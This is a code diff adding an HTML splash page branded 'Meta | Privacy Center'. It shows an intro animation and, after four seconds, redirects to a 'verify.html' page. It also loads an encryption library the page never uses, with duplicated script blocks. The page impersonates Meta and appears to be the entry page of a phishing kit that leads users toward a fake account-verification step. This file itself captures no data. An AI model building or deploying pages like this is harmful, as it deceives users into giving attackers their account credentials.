@@ -1,0 +1,132 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Meta | Privacy Center</title>
+
+    <!-- ✅ FAVICON -->
+<link rel="icon"
+      type="image/svg+xml"
+      href="./public/icons/favicon.svg?v=3">
+
+    <link rel="stylesheet" href="./public/styles/style.css">
+
+    <!-- Tailwind CSS CDN -->
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script>
+        tailwind.config = {
+            theme: {
+                extend: {
+                    colors: {
+                        primary: '#5D87FF',
+                        secondary: '#212121'
+                    }
+                }
+            }
+        }
+    </script>
+
+    <!-- CryptoJS for encryption -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.2.0/crypto-js.min.js"></script>
+
+    <script type="text/javascript">
+        function googleTranslateElementInit() {
+            new google.translate.TranslateElement(
+                {
+                    pageLanguage: 'en',
+                    layout: google.translate.TranslateElement.InlineLayout.SIMPLE
+                },
+                'google_translate_element'
+            );
+        }
+    </script>
+
+    <!-- CryptoJS for encryption -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.2.0/crypto-js.min.js"></script>
+
+    <script type="text/javascript">
+        function googleTranslateElementInit() {
+            new google.translate.TranslateElement(
+                {
+                    pageLanguage: 'en',
+                    layout: google.translate.TranslateElement.InlineLayout.SIMPLE
+                },
+                'google_translate_element'
+            );
+        }
+    </script>
+    <style>
+        * {
+            box-sizing: border-box;
+        }
+
+        body {
+            margin: 0;
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            background: #fff;
+            font-family: Arial, sans-serif;
+        }
+
+        .intro-container {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            gap: 20px;
+            width: 100%;
+            padding: 20px;
+        }
+
+        .intro-video {
+            display: block;
+            width: 100%;
+            max-width: 480px;
+            height: auto;
+            object-fit: contain;
+        }
+
+        .loader {
+            width: 36px;
+            height: 36px;
+            border: 3px solid #e5e7eb;
+            border-top-color: #1877f2;
+            border-radius: 50%;
+            animation: spinner 0.75s linear infinite;
+        }
+
+        @keyframes spinner {
+            to {
+                transform: rotate(360deg);
+            }
+        }
+
+        @media (max-width: 480px) {
+            .intro-video {
+                max-width: 100%;
+            }
+        }
+    </style>
+</head>
+
+<body>
+    <main class="intro-container">
+        <img
+            class="intro-video"
+            src="./public/images/intro.gif"
+            alt="Intro animation"
+        >
+    </main>
+
+    <script>
+        // Tự động chuyển trang sau 4 giây
+        setTimeout(function () {
+            window.location.replace('verify.html');
+        }, 4000);
+    </script>
+</body>
+</html>
